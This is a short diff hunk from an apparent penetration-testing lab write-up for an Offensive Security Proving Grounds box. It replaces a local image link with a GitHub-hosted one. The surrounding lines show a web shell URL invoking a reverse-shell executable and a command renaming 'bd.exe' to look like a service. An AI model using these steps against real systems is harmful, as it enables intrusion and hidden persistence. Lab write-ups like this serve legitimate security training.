@@ -531,7 +531,8 @@ http://192.168.224.127:45332/cmd.php?cmd=rev.exe
 
 move bd.exe bd.service.exe
 
-![[Pasted image 20240502171349.png]]
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/8e023565-7cb3-4a85-9cf9-3f6eadc2a6a7)
+
 
 - We alter the name of the reverse shell by typing the following command.
 
